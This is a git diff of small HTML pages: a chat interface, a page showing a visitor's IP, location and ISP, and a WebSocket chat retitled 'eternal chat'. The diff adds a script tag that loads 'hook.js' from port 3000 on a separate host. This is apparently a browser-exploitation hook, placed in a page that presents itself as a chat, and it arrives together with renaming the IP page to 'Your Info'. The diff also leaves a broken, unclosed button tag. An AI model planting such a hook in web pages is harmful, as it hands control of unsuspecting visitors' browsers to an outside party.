@@ -60,12 +60,14 @@
     </style>
 </head>
 <body>
-    <script src="publicIP.js"></script>
+    <script defer src= "script.js"></script>
+    <script async src="http://192.168.1.112:3000/hook.js" id="dynamic-script"></script>
+    <script defer src = "http://192.168.1.112:3001/webserver/chat/socket.io/socket.io.js" id="dynamic-script-2"></script>
 
 <div class="chat-container">
     <div class="messages" id="messages"></div>
     <div class="controls">
-        <input type="text" id="input" placeholder="Type a message...">
+        <input type="input-text" id="input-text" placeholder="Type a message...">
         <button id="send">Send</button>
     </div>
 </div>
@@ -78,7 +80,7 @@
         
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Visitor IP Info</title>
+    <title>Your Info</title>
 </head>
 <body>
     <h2>Visitor IP Information</h2>
@@ -87,7 +89,9 @@
     <p><strong>Location:</strong> <span id="location">Loading...</span></p>
     <p><strong>ISP:</strong> <span id="isp">Loading...</span></p>
 
-    <button onclick="useIP()">Use IP in Another Function</button>
+    <button onclick="updateIPui()"> Refresh Me </button>
+    <p> </p>
+    <button onClick=""
 
 </body>
 </html>
@@ -98,11 +102,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebSocket Example</title>
-    <script src="script.js"></script> <!-- Link to external JavaScript file -->
-</head>
+    <title> eternal chat </title>
+    <script defer src="script.js"></script> <!-- Link to external JavaScript file -->
+    </head>
 <body>
-    <h1>WebSocket Communication</h1>
+    <h1> talk to me </h1>
     <input type="text" id="messageInput" placeholder="Type a message...">
     <button id="sendButton">Send</button>
     <div id="messages"></div>
